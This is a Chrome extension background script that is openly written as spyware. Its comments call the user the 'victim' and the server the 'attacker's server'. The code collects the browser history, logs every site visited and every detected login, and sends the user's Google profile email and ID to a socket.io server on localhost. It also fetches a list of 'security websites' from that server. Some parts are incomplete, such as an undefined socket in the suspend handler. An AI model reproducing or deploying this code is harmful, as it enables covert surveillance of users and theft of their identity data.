chrome.runtime.onInstalled.addListener(() => {
  // Connect to server for the first time and get security websites
  var socket = connectToServer();
  getSecurityWebsites(socket);
  // Retrieves the browser history of the victim for the last 24 hours on install
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      console.log(page.url + '\n' +
        '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
        '    Visit Count: ' + page.visitCount);
    });
  });
  // Adds listener that will log all sites visited by victim
  chrome.history.onVisited.addListener((page) => {
    console.log(page.url + '\n' +
      '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
      '    Visit Count: ' + page.visitCount);
  });
});
chrome.runtime.onStartup.addListener(() => {
  // Connect to the socket server and get security websites
  var socket = connectToServer();
  getSecurityWebsites(socket);
});
chrome.runtime.onSuspend.addListener(() => {
  // Disconnect from server
  disconnectFromServer(socket);
});
chrome.runtime.onMessage.addListener((request, sender) => {
  console.log('Login detected: ' + request.loginListener);
});

function connectToServer() {
  // Connect to attacker's server
  socket = io('http://localhost:3000');

  // When user is connected, send user data
  chrome.storage.sync.clear();
  chrome.identity.getProfileUserInfo((userInfo) => {
    if (userInfo.email == null){
      userInfo.email = "No email";
      userInfo.id = "User not logged in";
    }
    socket.emit('userInfo', userInfo);
  });
  return socket;
}

function disconnectFromServer(socket) {
  // Disconnect socket
  socket.disconnect();
}

function getSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.sync.set({
      'securityWebsites': securityWebsites
    }, () => {
      for (var i = 0; i < securityWebsites.length; i++) {
        console.log(securityWebsites[i]);
      }
    });
  });
}
